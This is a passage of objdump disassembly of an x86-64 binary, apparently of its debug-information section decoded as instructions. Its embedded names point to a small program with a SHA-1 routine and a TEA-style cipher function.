     b5e:	73 74                	jae    bd4 <_init-0x4001c4>
     b60:	72 00                	jb     b62 <_init-0x400236>
     b62:	01 5c 01 d5          	add    %ebx,-0x2b(%rcx,%rax,1)
     b66:	05 00 00 03 91       	add    $0x91030000,%eax
     b6b:	d0 5c 00 22          	rcrb   0x22(%rax,%rax,1)
     b6f:	2b 26                	sub    (%rsi),%esp
     b71:	40 00 00             	add    %al,(%rax)
     b74:	00 00                	add    %al,(%rax)
     b76:	00 59 00             	add    %bl,0x0(%rcx)
     b79:	00 00                	add    %al,(%rax)
     b7b:	00 00                	add    %al,(%rax)
     b7d:	00 00                	add    %al,(%rax)
     b7f:	94                   	xchg   %eax,%esp
     b80:	0b 00                	or     (%rax),%eax
     b82:	00 20                	add    %ah,(%rax)
     b84:	73 74                	jae    bfa <_init-0x40019e>
     b86:	72 00                	jb     b88 <_init-0x400210>
     b88:	01 67 01             	add    %esp,0x1(%rdi)
     b8b:	d5                   	(bad)  
     b8c:	05 00 00 03 91       	add    $0x91030000,%eax
     b91:	d0 5c 00 19          	rcrb   0x19(%rax,%rax,1)
     b95:	b7 27                	mov    $0x27,%bh
     b97:	40 00 00             	add    %al,(%rax)
     b9a:	00 00                	add    %al,(%rax)
     b9c:	00 60 03             	add    %ah,0x3(%rax)
     b9f:	00 00                	add    %al,(%rax)
     ba1:	00 00                	add    %al,(%rax)
     ba3:	00 00                	add    %al,(%rax)
     ba5:	20 6e 00             	and    %ch,0x0(%rsi)
     ba8:	01 95 01 57 00 00    	add    %edx,0x5701(%rbp)
     bae:	00 03                	add    %al,(%rbx)
     bb0:	91                   	xchg   %eax,%ecx
     bb1:	c4                   	(bad)  
     bb2:	5b                   	pop    %rbx
     bb3:	19 b7 27 40 00 00    	sbb    %esi,0x4027(%rdi)
     bb9:	00 00                	add    %al,(%rax)
     bbb:	00 2b                	add    %ch,(%rbx)
     bbd:	00 00                	add    %al,(%rax)
     bbf:	00 00                	add    %al,(%rax)
     bc1:	00 00                	add    %al,(%rax)
     bc3:	00 1f                	add    %bl,(%rdi)
     bc5:	62                   	(bad)  
     bc6:	04 00                	add    $0x0,%al
     bc8:	00 01                	add    %al,(%rcx)
     bca:	91                   	xchg   %eax,%ecx
     bcb:	01 57 00             	add    %edx,0x0(%rdi)
     bce:	00 00                	add    %al,(%rax)
     bd0:	03 91 bc 5b 1f 67    	add    0x671f5bbc(%rcx),%edx
     bd6:	04 00                	add    $0x0,%al
     bd8:	00 01                	add    %al,(%rcx)
     bda:	91                   	xchg   %eax,%ecx
     bdb:	01 57 00             	add    %edx,0x0(%rdi)
     bde:	00 00                	add    %al,(%rax)
     be0:	03 91 c0 5b 00 00    	add    0x5bc0(%rcx),%edx
     be6:	00 09                	add    %cl,(%rcx)
     be8:	88 00                	mov    %al,(%rax)
     bea:	00 00                	add    %al,(%rax)
     bec:	f7                   	(bad)  
     bed:	0b 00                	or     (%rax),%eax
     bef:	00 0a                	add    %cl,(%rdx)
     bf1:	65 00 00             	add    %al,%gs:(%rax)
     bf4:	00 ff                	add    %bh,%bh
     bf6:	00 09                	add    %cl,(%rcx)
     bf8:	88 00                	mov    %al,(%rax)
     bfa:	00 00                	add    %al,(%rax)
     bfc:	07                   	(bad)  
     bfd:	0c 00                	or     $0x0,%al
     bff:	00 0a                	add    %cl,(%rdx)
     c01:	65 00 00             	add    %al,%gs:(%rax)
     c04:	00 04 00             	add    %al,(%rax,%rax,1)
     c07:	1a f7                	sbb    %bh,%dh
     c09:	0b 00                	or     (%rax),%eax
     c0b:	00 23                	add    %ah,(%rbx)
     c0d:	8c 00                	mov    %es,(%rax)
     c0f:	00 00                	add    %al,(%rax)
     c11:	0d 31 82 00 00       	or     $0x8231,%eax
     c16:	00 09                	add    %cl,(%rcx)
     c18:	03 90 91 60 00 00    	add    0x6091(%rax),%edx
     c1e:	00 00                	add    %al,(%rax)
     c20:	00 23                	add    %ah,(%rbx)
     c22:	76 00                	jbe    c24 <_init-0x400174>
     c24:	00 00                	add    %al,(%rax)
     c26:	01 2c 57             	add    %ebp,(%rdi,%rdx,2)
     c29:	00 00                	add    %al,(%rax)
     c2b:	00 09                	add    %cl,(%rcx)
     c2d:	03 e4                	add    %esp,%esp
     c2f:	91                   	xchg   %eax,%ecx
     c30:	60                   	(bad)  
     c31:	00 00                	add    %al,(%rax)
     c33:	00 00                	add    %al,(%rax)
     c35:	00 23                	add    %ah,(%rbx)
     c37:	37                   	(bad)  
     c38:	00 00                	add    %al,(%rax)
     c3a:	00 01                	add    %al,(%rcx)
     c3c:	2d 57 00 00 00       	sub    $0x57,%eax
     c41:	09 03                	or     %eax,(%rbx)
     c43:	e8 91 60 00 00       	callq  6cd9 <_init-0x3fa0bf>
     c48:	00 00                	add    %al,(%rax)
     c4a:	00 00                	add    %al,(%rax)
     c4c:	45 03 00             	add    (%r8),%r8d
     c4f:	00 04 00             	add    %al,(%rax,%rax,1)
     c52:	fa                   	cli    
     c53:	01 00                	add    %eax,(%rax)
     c55:	00 08                	add    %cl,(%rax)
     c57:	01 b7 02 00 00 01    	add    %esi,0x1000002(%rdi)
     c5d:	00 06                	add    %al,(%rsi)
     c5f:	00 00                	add    %al,(%rax)
     c61:	a5                   	movsl  %ds:(%rsi),%es:(%rdi)
     c62:	04 00                	add    $0x0,%al
     c64:	00 8a 2b 40 00 00    	add    %cl,0x402b(%rdx)
     c6a:	00 00                	add    %al,(%rax)
     c6c:	00 8e 04 00 00 00    	add    %cl,0x4(%rsi)
     c72:	00 00                	add    %al,(%rax)
     c74:	00 6b 03             	add    %ch,0x3(%rbx)
     c77:	00 00                	add    %al,(%rax)
     c79:	02 db                	add    %bl,%bl
     c7b:	05 00 00 02 d4       	add    $0xd4020000,%eax
     c80:	38 00                	cmp    %al,(%rax)
     c82:	00 00                	add    %al,(%rax)
     c84:	03 08                	add    (%rax),%ecx
     c86:	07                   	(bad)  
     c87:	e0 00                	loopne c89 <_init-0x40010f>
     c89:	00 00                	add    %al,(%rax)
     c8b:	04 04                	add    $0x4,%al
     c8d:	05 69 6e 74 00       	add    $0x746e69,%eax
     c92:	03 01                	add    (%rcx),%eax
     c94:	08 75 03             	or     %dh,0x3(%rbp)
     c97:	00 00                	add    %al,(%rax)
     c99:	03 02                	add    (%rdx),%eax
     c9b:	07                   	(bad)  
     c9c:	22 02                	and    (%rdx),%al
     c9e:	00 00                	add    %al,(%rax)
     ca0:	03 04 07             	add    (%rdi,%rax,1),%eax
     ca3:	e5 00                	in     $0x0,%eax
     ca5:	00 00                	add    %al,(%rax)
     ca7:	03 01                	add    (%rcx),%eax
     ca9:	06                   	(bad)  
     caa:	77 03                	ja     caf <_init-0x4000e9>
     cac:	00 00                	add    %al,(%rax)
     cae:	03 02                	add    (%rdx),%eax
     cb0:	05 be 03 00 00       	add    $0x3be,%eax
     cb5:	03 08                	add    (%rax),%ecx
     cb7:	05 c6 00 00 00       	add    $0xc6,%eax
     cbc:	02 2b                	add    (%rbx),%ch
     cbe:	06                   	(bad)  
     cbf:	00 00                	add    %al,(%rax)
     cc1:	03 83 69 00 00 00    	add    0x69(%rbx),%eax
     cc7:	03 08                	add    (%rax),%ecx
     cc9:	07                   	(bad)  
     cca:	92                   	xchg   %eax,%edx
     ccb:	02 00                	add    (%rax),%al
     ccd:	00 02                	add    %al,(%rdx)
     ccf:	c7 04 00 00 03 8b 69 	movl   $0x698b0300,(%rax,%rax,1)
     cd6:	00 00                	add    %al,(%rax)
     cd8:	00 05 08 93 00 00    	add    %al,0x9308(%rip)        # 9fe6 <_init-0x3f6db2>
     cde:	00 03                	add    %al,(%rbx)
     ce0:	01 06                	add    %eax,(%rsi)
     ce2:	7e 03                	jle    ce7 <_init-0x4000b1>
     ce4:	00 00                	add    %al,(%rax)
     ce6:	03 08                	add    (%rax),%ecx
     ce8:	05 c1 00 00 00       	add    $0xc1,%eax
     ced:	02 2d 06 00 00 04    	add    0x4000006(%rip),%ch        # 4000cf9 <_end+0x39f7b09>
     cf3:	56                   	push   %rsi
     cf4:	70 00                	jo     cf6 <_init-0x4000a2>
     cf6:	00 00                	add    %al,(%rax)
     cf8:	02 c9                	add    %cl,%cl
     cfa:	04 00                	add    $0x0,%al
     cfc:	00 05 4b 82 00 00    	add    %al,0x824b(%rip)        # 8f4d <_init-0x3f7e4b>
     d02:	00 03                	add    %al,(%rbx)
     d04:	08 07                	or     %al,(%rdi)
     d06:	db 00                	fildl  (%rax)
     d08:	00 00                	add    %al,(%rax)
     d0a:	05 08 c4 00 00       	add    $0xc408,%eax
     d0f:	00 06                	add    %al,(%rsi)
     d11:	93                   	xchg   %eax,%ebx
     d12:	00 00                	add    %al,(%rax)
     d14:	00 02                	add    %al,(%rdx)
     d16:	29 04 00             	sub    %eax,(%rax,%rax,1)
     d19:	00 06                	add    %al,(%rsi)
     d1b:	33 54 00 00          	xor    0x0(%rax,%rax,1),%edx
     d1f:	00 07                	add    %al,(%rdi)
     d21:	74 6d                	je     d90 <_init-0x400008>
     d23:	00 38                	add    %bh,(%rax)
     d25:	05 85 64 01 00       	add    $0x16485,%eax
     d2a:	00 08                	add    %cl,(%rax)
     d2c:	f0 05 00 00 05 87    	lock add $0x87050000,%eax
     d32:	3f                   	(bad)  
     d33:	00 00                	add    %al,(%rax)
     d35:	00 00                	add    %al,(%rax)
     d37:	08 e9                	or     %ch,%cl
     d39:	05 00 00 05 88       	add    $0x88050000,%eax
     d3e:	3f                   	(bad)  
     d3f:	00 00                	add    %al,(%rax)
     d41:	00 04 08             	add    %al,(%rax,%rcx,1)
     d44:	c1 05 00 00 05 89 3f 	roll   $0x3f,-0x76fb0000(%rip)        # ffffffff89050d4b <_end+0xffffffff88a47b5b>
     d4b:	00 00                	add    %al,(%rax)
     d4d:	00 08                	add    %cl,(%rax)
     d4f:	08 42 06             	or     %al,0x6(%rdx)
     d52:	00 00                	add    %al,(%rax)
     d54:	05 8a 3f 00 00       	add    $0x3f8a,%eax
     d59:	00 0c 08             	add    %cl,(%rax,%rcx,1)
     d5c:	1c 06                	sbb    $0x6,%al
     d5e:	00 00                	add    %al,(%rax)
     d60:	05 8b 3f 00 00       	add    $0x3f8b,%eax
     d65:	00 10                	add    %dl,(%rax)
     d67:	08 23                	or     %ah,(%rbx)
     d69:	06                   	(bad)  
     d6a:	00 00                	add    %al,(%rax)
     d6c:	05 8c 3f 00 00       	add    $0x3f8c,%eax
     d71:	00 14 08             	add    %dl,(%rax,%rcx,1)
     d74:	a4                   	movsb  %ds:(%rsi),%es:(%rdi)
     d75:	05 00 00 05 8d       	add    $0x8d050000,%eax
     d7a:	3f                   	(bad)  
     d7b:	00 00                	add    %al,(%rax)
     d7d:	00 18                	add    %bl,(%rax)
     d7f:	08 08                	or     %cl,(%rax)
     d81:	06                   	(bad)  
     d82:	00 00                	add    %al,(%rax)
     d84:	05 8e 3f 00 00       	add    $0x3f8e,%eax
     d89:	00 1c 08             	add    %bl,(%rax,%rcx,1)
     d8c:	f7 05 00 00 05 8f 3f 	testl  $0x3f,-0x70fb0000(%rip)        # ffffffff8f050d96 <_end+0xffffffff8ea47ba6>
     d93:	00 00 00 
     d96:	20 08                	and    %cl,(%rax)
     d98:	d1 05 00 00 05 92    	roll   -0x6dfb0000(%rip)        # ffffffff92050d9e <_end+0xffffffff91a47bae>
     d9e:	69 00 00 00 28 08    	imul   $0x8280000,(%rax),%eax
     da4:	c9                   	leaveq 
     da5:	05 00 00 05 93       	add    $0x93050000,%eax
     daa:	be 00 00 00 30       	mov    $0x30000000,%esi
     daf:	00 09                	add    %cl,(%rcx)
     db1:	33 06                	xor    (%rsi),%eax
     db3:	00 00                	add    %al,(%rax)
     db5:	01 0e                	add    %ecx,(%rsi)
     db7:	8a 2b                	mov    (%rbx),%ch
     db9:	40 00 00             	add    %al,(%rax)
     dbc:	00 00                	add    %al,(%rax)
     dbe:	00 fb                	add    %bh,%bl
     dc0:	00 00                	add    %al,(%rax)
     dc2:	00 00                	add    %al,(%rax)
     dc4:	00 00                	add    %al,(%rax)
     dc6:	00 01                	add    %al,(%rcx)
     dc8:	9c                   	pushfq 
     dc9:	c3                   	retq   
     dca:	01 00                	add    %eax,(%rax)
     dcc:	00 0a                	add    %cl,(%rdx)
     dce:	62                   	(bad)  
     dcf:	75 66                	jne    e37 <_init-0x3fff61>
     dd1:	00 01                	add    %al,(%rcx)
     dd3:	0e                   	(bad)  
     dd4:	c3                   	retq   
     dd5:	01 00                	add    %eax,(%rax)
     dd7:	00 02                	add    %al,(%rdx)
     dd9:	91                   	xchg   %eax,%ecx
     dda:	58                   	pop    %rax
     ddb:	0a 73 00             	or     0x0(%rbx),%dh
     dde:	01 0e                	add    %ecx,(%rsi)
     de0:	a1 00 00 00 02 91 50 	movabs 0x730a509102000000,%eax
     de7:	0a 73 
     de9:	7a 00                	jp     deb <_init-0x3fffad>
     deb:	01 0e                	add    %ecx,(%rsi)
     ded:	2d 00 00 00 02       	sub    $0x2000000,%eax
     df2:	91                   	xchg   %eax,%ecx
     df3:	48 0b 69 00          	or     0x0(%rcx),%rbp
     df7:	01 0f                	add    %ecx,(%rdi)
     df9:	54                   	push   %rsp
     dfa:	00 00                	add    %al,(%rax)
     dfc:	00 02                	add    %al,(%rdx)
     dfe:	91                   	xchg   %eax,%ecx
     dff:	64 0b 70 74          	or     %fs:0x74(%rax),%esi
     e03:	72 00                	jb     e05 <_init-0x3fff93>
     e05:	01 10                	add    %edx,(%rax)
     e07:	c3                   	retq   
     e08:	01 00                	add    %eax,(%rax)
     e0a:	00 02                	add    %al,(%rdx)
     e0c:	91                   	xchg   %eax,%ecx
     e0d:	68 00 05 08 c9       	pushq  $0xffffffffc9080500
     e12:	01 00                	add    %eax,(%rax)
     e14:	00 06                	add    %al,(%rsi)
     e16:	46 00 00             	rex.RX add %r8b,(%rax)
     e19:	00 09                	add    %cl,(%rcx)
     e1b:	10 06                	adc    %al,(%rsi)
     e1d:	00 00                	add    %al,(%rax)
     e1f:	01 25 85 2c 40 00    	add    %esp,0x402c85(%rip)        # 403aaa <sha1_process+0xa32>
     e25:	00 00                	add    %al,(%rax)
     e27:	00 00                	add    %al,(%rax)
     e29:	5b                   	pop    %rbx
     e2a:	00 00                	add    %al,(%rax)
     e2c:	00 00                	add    %al,(%rax)
     e2e:	00 00                	add    %al,(%rax)
     e30:	00 01                	add    %al,(%rcx)
     e32:	9c                   	pushfq 
     e33:	19 02                	sbb    %eax,(%rdx)
     e35:	00 00                	add    %al,(%rax)
     e37:	0a 73 74             	or     0x74(%rbx),%dh
     e3a:	72 00                	jb     e3c <_init-0x3fff5c>
     e3c:	01 25 8d 00 00 00    	add    %esp,0x8d(%rip)        # ecf <_init-0x3ffec9>
     e42:	03 91 98 7f 0b 6e    	add    0x6e0b7f98(%rcx),%edx
     e48:	6f                   	outsl  %ds:(%rsi),(%dx)
     e49:	77 00                	ja     e4b <_init-0x3fff4d>
     e4b:	01 26                	add    %esp,(%rsi)
     e4d:	ac                   	lods   %ds:(%rsi),%al
     e4e:	00 00                	add    %al,(%rax)
     e50:	00 03                	add    %al,(%rbx)
     e52:	91                   	xchg   %eax,%ecx
     e53:	a8 7f                	test   $0x7f,%al
     e55:	0c ac                	or     $0xac,%al
     e57:	05 00 00 01 27       	add    $0x27010000,%eax
     e5c:	d4                   	(bad)  
     e5d:	00 00                	add    %al,(%rax)
     e5f:	00 03                	add    %al,(%rbx)
     e61:	91                   	xchg   %eax,%ecx
     e62:	b0 7f                	mov    $0x7f,%al
     e64:	00 0d 96 05 00 00    	add    %cl,0x596(%rip)        # 1400 <_init-0x3ff998>
     e6a:	01 2f                	add    %ebp,(%rdi)
     e6c:	e0 2c                	loopne e9a <_init-0x3ffefe>
     e6e:	40 00 00             	add    %al,(%rax)
     e71:	00 00                	add    %al,(%rax)
     e73:	00 ab 01 00 00 00    	add    %ch,0x1(%rbx)
     e79:	00 00                	add    %al,(%rax)
     e7b:	00 01                	add    %al,(%rcx)
     e7d:	9c                   	pushfq 
     e7e:	aa                   	stos   %al,%es:(%rdi)
     e7f:	02 00                	add    (%rax),%al
     e81:	00 0a                	add    %cl,(%rdx)
     e83:	76 00                	jbe    e85 <_init-0x3fff13>
     e85:	01 2f                	add    %ebp,(%rdi)
     e87:	aa                   	stos   %al,%es:(%rdi)
     e88:	02 00                	add    (%rax),%al
     e8a:	00 02                	add    %al,(%rdx)
     e8c:	91                   	xchg   %eax,%ecx
     e8d:	48 0a 6e 00          	rex.W or 0x0(%rsi),%bpl
     e91:	01 2f                	add    %ebp,(%rdi)
     e93:	2d 00 00 00 02       	sub    $0x2000000,%eax
     e98:	91                   	xchg   %eax,%ecx
     e99:	40 0a 6b 65          	or     0x65(%rbx),%bpl
     e9d:	79 00                	jns    e9f <_init-0x3ffef9>
     e9f:	01 2f                	add    %ebp,(%rdi)
     ea1:	b0 02                	mov    $0x2,%al
     ea3:	00 00                	add    %al,(%rax)
     ea5:	03 91 b8 7f 0c e2    	add    -0x1df38048(%rcx),%edx
     eab:	05 00 00 01 30       	add    $0x30010000,%eax
     eb0:	c9                   	leaveq 
     eb1:	00 00                	add    %al,(%rax)
     eb3:	00 02                	add    %al,(%rdx)
     eb5:	91                   	xchg   %eax,%ecx
     eb6:	58                   	pop    %rax
     eb7:	0b 73 75             	or     0x75(%rbx),%esi
     eba:	6d                   	insl   (%dx),%es:(%rdi)
     ebb:	00 01                	add    %al,(%rcx)
     ebd:	31 c9                	xor    %ecx,%ecx
     ebf:	00 00                	add    %al,(%rax)
     ec1:	00 02                	add    %al,(%rdx)
     ec3:	91                   	xchg   %eax,%ecx
     ec4:	5c                   	pop    %rsp
     ec5:	0b 7a 00             	or     0x0(%rdx),%edi
     ec8:	01 32                	add    %esi,(%rdx)
     eca:	c9                   	leaveq 
     ecb:	00 00                	add    %al,(%rax)
     ecd:	00 02                	add    %al,(%rdx)
     ecf:	91                   	xchg   %eax,%ecx
     ed0:	60                   	(bad)  
     ed1:	0b 79 00             	or     0x0(%rcx),%edi
     ed4:	01 33                	add    %esi,(%rbx)
     ed6:	c9                   	leaveq 
     ed7:	00 00                	add    %al,(%rax)
     ed9:	00 02                	add    %al,(%rdx)
     edb:	91                   	xchg   %eax,%ecx
     edc:	6c                   	insb   (%dx),%es:(%rdi)
     edd:	0b 70 00             	or     0x0(%rax),%esi
     ee0:	01 33                	add    %esi,(%rbx)
     ee2:	c9                   	leaveq 
     ee3:	00 00                	add    %al,(%rax)
     ee5:	00 02                	add    %al,(%rdx)
     ee7:	91                   	xchg   %eax,%ecx
     ee8:	64 0b 65 00          	or     %fs:0x0(%rbp),%esp
     eec:	01 33                	add    %esi,(%rbx)
     eee:	c9                   	leaveq 
     eef:	00 00                	add    %al,(%rax)
     ef1:	00 02                	add    %al,(%rdx)
     ef3:	91                   	xchg   %eax,%ecx
     ef4:	68 00 05 08 c9       	pushq  $0xffffffffc9080500
     ef9:	00 00                	add    %al,(%rax)
     efb:	00 05 08 b6 02 00    	add    %al,0x2b608(%rip)        # 2c509 <_init-0x3d488f>
     f01:	00 06                	add    %al,(%rsi)
     f03:	c9                   	leaveq 
     f04:	00 00                	add    %al,(%rax)
     f06:	00 0e                	add    %cl,(%rsi)
     f08:	b3 05                	mov    $0x5,%bl
     f0a:	00 00                	add    %al,(%rax)
     f0c:	01 40 8b             	add    %eax,-0x75(%rax)
     f0f:	2e 40 00 00          	add    %al,%cs:(%rax)
     f13:	00 00                	add    %al,(%rax)
     f15:	00 8d 01 00 00 00    	add    %cl,0x1(%rbp)
     f1b:	00 00                	add    %al,(%rax)
     f1d:	00 01                	add    %al,(%rcx)
     f1f:	9c                   	pushfq 
     f20:	0a 76 00             	or     0x0(%rsi),%dh
     f23:	01 40 aa             	add    %eax,-0x56(%rax)
     f26:	02 00                	add    (%rax),%al
     f28:	00 02                	add    %al,(%rdx)
     f2a:	91                   	xchg   %eax,%ecx
     f2b:	48 0a 6e 00          	rex.W or 0x0(%rsi),%bpl
     f2f:	01 40 2d             	add    %eax,0x2d(%rax)
     f32:	00 00                	add    %al,(%rax)
     f34:	00 02                	add    %al,(%rdx)
     f36:	91                   	xchg   %eax,%ecx
     f37:	40 0a 6b 65          	or     0x65(%rbx),%bpl
     f3b:	79 00                	jns    f3d <_init-0x3ffe5b>
     f3d:	01 40 b0             	add    %eax,-0x50(%rax)
     f40:	02 00                	add    (%rax),%al
     f42:	00 03                	add    %al,(%rbx)
     f44:	91                   	xchg   %eax,%ecx
     f45:	b8 7f 0c e2 05       	mov    $0x5e20c7f,%eax
     f4a:	00 00                	add    %al,(%rax)
     f4c:	01 41 c9             	add    %eax,-0x37(%rcx)
     f4f:	00 00                	add    %al,(%rax)
     f51:	00 02                	add    %al,(%rdx)
     f53:	91                   	xchg   %eax,%ecx
     f54:	64 0b 73 75          	or     %fs:0x75(%rbx),%esi
     f58:	6d                   	insl   (%dx),%es:(%rdi)
     f59:	00 01                	add    %al,(%rcx)
     f5b:	42 c9                	rex.X leaveq 
     f5d:	00 00                	add    %al,(%rax)
     f5f:	00 02                	add    %al,(%rdx)
     f61:	91                   	xchg   %eax,%ecx
     f62:	58                   	pop    %rax
     f63:	0b 79 00             	or     0x0(%rcx),%edi
     f66:	01 43 c9             	add    %eax,-0x37(%rbx)
     f69:	00 00                	add    %al,(%rax)
     f6b:	00 02                	add    %al,(%rdx)
     f6d:	91                   	xchg   %eax,%ecx
     f6e:	5c                   	pop    %rsp
     f6f:	0b 7a 00             	or     0x0(%rdx),%edi
     f72:	01 44 c9 00          	add    %eax,0x0(%rcx,%rcx,8)
     f76:	00 00                	add    %al,(%rax)
     f78:	02 91 6c 0b 70 00    	add    0x700b6c(%rcx),%dl
     f7e:	01 44 c9 00          	add    %eax,0x0(%rcx,%rcx,8)
     f82:	00 00                	add    %al,(%rax)
     f84:	02 91 60 0b 65 00    	add    0x650b60(%rcx),%dl
     f8a:	01 44 c9 00          	add    %eax,0x0(%rcx,%rcx,8)
     f8e:	00 00                	add    %al,(%rax)
     f90:	02 91 68 00 00 a8    	add    -0x57ffff98(%rcx),%dl
     f96:	02 00                	add    (%rax),%al
     f98:	00 04 00             	add    %al,(%rax,%rax,1)
     f9b:	d8 02                	fadds  (%rdx)
     f9d:	00 00                	add    %al,(%rax)
     f9f:	08 01                	or     %al,(%rcx)
     fa1:	b7 02                	mov    $0x2,%bh
     fa3:	00 00                	add    %al,(%rax)
     fa5:	01 93 06 00 00 a5    	add    %edx,-0x5afffffa(%rbx)
     fab:	04 00                	add    $0x0,%al
     fad:	00 18                	add    %bl,(%rax)
     faf:	30 40 00             	xor    %al,0x0(%rax)
     fb2:	00 00                	add    %al,(%rax)
     fb4:	00 00                	add    %al,(%rax)
     fb6:	c5 45 00             	(bad)  
     fb9:	00 00                	add    %al,(%rax)
     fbb:	00 00                	add    %al,(%rax)
     fbd:	00 d9                	add    %bl,%cl
     fbf:	04 00                	add    $0x0,%al
     fc1:	00 02                	add    %al,(%rdx)
     fc3:	08 07                	or     %al,(%rdi)
     fc5:	e0 00                	loopne fc7 <_init-0x3ffdd1>
     fc7:	00 00                	add    %al,(%rax)
     fc9:	02 08                	add    (%rax),%cl
     fcb:	07                   	(bad)  
     fcc:	92                   	xchg   %eax,%edx
     fcd:	02 00                	add    (%rax),%al
     fcf:	00 02                	add    %al,(%rdx)
     fd1:	02 07                	add    (%rdi),%al
     fd3:	22 02                	and    (%rdx),%al
     fd5:	00 00                	add    %al,(%rax)
     fd7:	03 04 05 69 6e 74 00 	add    0x746e69(,%rax,1),%eax
     fde:	02 01                	add    (%rcx),%al
     fe0:	06                   	(bad)  
     fe1:	7e 03                	jle    fe6 <_init-0x3ffdb2>
     fe3:	00 00                	add    %al,(%rax)
     fe5:	04 78                	add    $0x78,%al
     fe7:	02 0c 7d 00 00 00 05 	add    0x5000000(,%rdi,2),%cl
     fee:	9f                   	lahf   
     fef:	04 00                	add    $0x0,%al
     ff1:	00 02                	add    %al,(%rdx)
     ff3:	0e                   	(bad)  
     ff4:	7d 00                	jge    ff6 <_init-0x3ffda2>
     ff6:	00 00                	add    %al,(%rax)
     ff8:	00 05 f2 01 00 00    	add    %al,0x1f2(%rip)        # 11f0 <_init-0x3ffba8>
     ffe:	02 0f                	add    (%rdi),%cl
    1000:	8d 00                	lea    (%rax),%eax
    1002:	00 00                	add    %al,(%rax)
    1004:	10 05 6c 04 00 00    	adc    %al,0x46c(%rip)        # 1476 <_init-0x3ff922>
    100a:	02 10                	add    (%rax),%dl
    100c:	9d                   	popfq  
    100d:	00 00                	add    %al,(%rax)
    100f:	00 38                	add    %bh,(%rax)
    1011:	00 06                	add    %al,(%rsi)
    1013:	2d 00 00 00 8d       	sub    $0x8d000000,%eax
    1018:	00 00                	add    %al,(%rax)
    101a:	00 07                	add    %al,(%rdi)
    101c:	34 00                	xor    $0x0,%al
    101e:	00 00                	add    %al,(%rax)
    1020:	01 00                	add    %eax,(%rax)
    1022:	06                   	(bad)  
    1023:	2d 00 00 00 9d       	sub    $0x9d000000,%eax
    1028:	00 00                	add    %al,(%rax)
    102a:	00 07                	add    %al,(%rdi)
    102c:	34 00                	xor    $0x0,%al
    102e:	00 00                	add    %al,(%rax)
    1030:	04 00                	add    $0x0,%al
    1032:	06                   	(bad)  
    1033:	ad                   	lods   %ds:(%rsi),%eax
    1034:	00 00                	add    %al,(%rax)
    1036:	00 ad 00 00 00 07    	add    %ch,0x7000000(%rbp)
    103c:	34 00                	xor    $0x0,%al
    103e:	00 00                	add    %al,(%rax)
    1040:	3f                   	(bad)  
    1041:	00 02                	add    %al,(%rdx)
    1043:	01 08                	add    %ecx,(%rax)
    1045:	75 03                	jne    104a <_init-0x3ffd4e>
    1047:	00 00                	add    %al,(%rax)
    1049:	08 b4 00 00 00 02 12 	or     %dh,0x12020000(%rax,%rax,1)
    1050:	50                   	push   %rax
    1051:	00 00                	add    %al,(%rax)
    1053:	00 09                	add    %cl,(%rcx)
    1055:	ae                   	scas   %es:(%rdi),%al
    1056:	06                   	(bad)  
    1057:	00 00                	add    %al,(%rax)
    1059:	01 15 18 30 40 00    	add    %edx,0x403018(%rip)        # 404077 <sha1_process+0xfff>
    105f:	00 00                	add    %al,(%rax)
    1061:	00 00                	add    %al,(%rax)
    1063:	60                   	(bad)  
    1064:	00 00                	add    %al,(%rax)
    1066:	00 00                	add    %al,(%rax)
    1068:	00 00                	add    %al,(%rax)
    106a:	00 01                	add    %al,(%rcx)
    106c:	9c                   	pushfq 
    106d:	eb 00                	jmp    106f <_init-0x3ffd29>
    106f:	00 00                	add    %al,(%rax)
    1071:	0a 63 74             	or     0x74(%rbx),%ah
    1074:	78 00                	js     1076 <_init-0x3ffd22>
    1076:	01 15 eb 00 00 00    	add    %edx,0xeb(%rip)        # 1167 <_init-0x3ffc31>
    107c:	02 91 68 00 0b 08    	add    0x80b0068(%rcx),%dl
    1082:	b4 00                	mov    $0x0,%ah
    1084:	00 00                	add    %al,(%rax)
    1086:	09 7b 06             	or     %edi,0x6(%rbx)
    1089:	00 00                	add    %al,(%rax)
    108b:	01 21                	add    %esp,(%rcx)
    108d:	78 30                	js     10bf <_init-0x3ffcd9>
    108f:	40 00 00             	add    %al,(%rax)
    1092:	00 00                	add    %al,(%rax)
    1094:	00 76 41             	add    %dh,0x41(%rsi)
    1097:	00 00                	add    %al,(%rax)
    1099:	00 00                	add    %al,(%rax)
    109b:	00 00                	add    %al,(%rax)
    109d:	01 9c 8a 01 00 00 0a 	add    %ebx,0xa000001(%rdx,%rcx,4)
    10a4:	63 74 78 00          	movslq 0x0(%rax,%rdi,2),%esi
    10a8:	01 21                	add    %esp,(%rcx)
    10aa:	eb 00                	jmp    10ac <_init-0x3ffcec>
    10ac:	00 00                	add    %al,(%rax)
    10ae:	03 91 b8 7e 0c 1d    	add    0x1d0c7eb8(%rcx),%edx
    10b4:	05 00 00 01 21       	add    $0x21010000,%eax
    10b9:	8a 01                	mov    (%rcx),%al
    10bb:	00 00                	add    %al,(%rax)
    10bd:	03 91 b0 7e 0d a4    	add    -0x5bf28150(%rcx),%edx
    10c3:	06                   	(bad)  
    10c4:	00 00                	add    %al,(%rax)
    10c6:	01 23                	add    %esp,(%rbx)
    10c8:	2d 00 00 00 03       	sub    $0x3000000,%eax
    10cd:	91                   	xchg   %eax,%ecx
    10ce:	e8 7e 0e 57 00       	callq  571f51 <__FRAME_END__+0x169fc1>
    10d3:	01 23                	add    %esp,(%rbx)
    10d5:	90                   	nop
    10d6:	01 00                	add    %eax,(%rax)
    10d8:	00 03                	add    %al,(%rbx)
    10da:	91                   	xchg   %eax,%ecx
    10db:	f0 7e 0e             	lock jle 10ec <_init-0x3ffcac>
    10de:	41 00 01             	add    %al,(%r9)
    10e1:	23 2d 00 00 00 03    	and    0x3000000(%rip),%ebp        # 30010e7 <_end+0x29f7ef7>
    10e7:	91                   	xchg   %eax,%ecx
    10e8:	c0 7e 0e 42          	sarb   $0x42,0xe(%rsi)
    10ec:	00 01                	add    %al,(%rcx)
    10ee:	23 2d 00 00 00 03    	and    0x3000000(%rip),%ebp        # 30010f4 <_end+0x29f7f04>
    10f4:	91                   	xchg   %eax,%ecx
    10f5:	c8 7e 0e 43          	enterq $0xe7e,$0x43
    10f9:	00 01                	add    %al,(%rcx)
    10fb:	23 2d 00 00 00 03    	and    0x3000000(%rip),%ebp        # 3001101 <_end+0x29f7f11>
    1101:	91                   	xchg   %eax,%ecx
    1102:	d0 7e 0e             	sarb   0xe(%rsi)
    1105:	44 00 01             	add    %r8b,(%rcx)
    1108:	23 2d 00 00 00 03    	and    0x3000000(%rip),%ebp        # 300110e <_end+0x29f7f1e>
    110e:	91                   	xchg   %eax,%ecx
    110f:	d8 7e 0e             	fdivrs 0xe(%rsi)
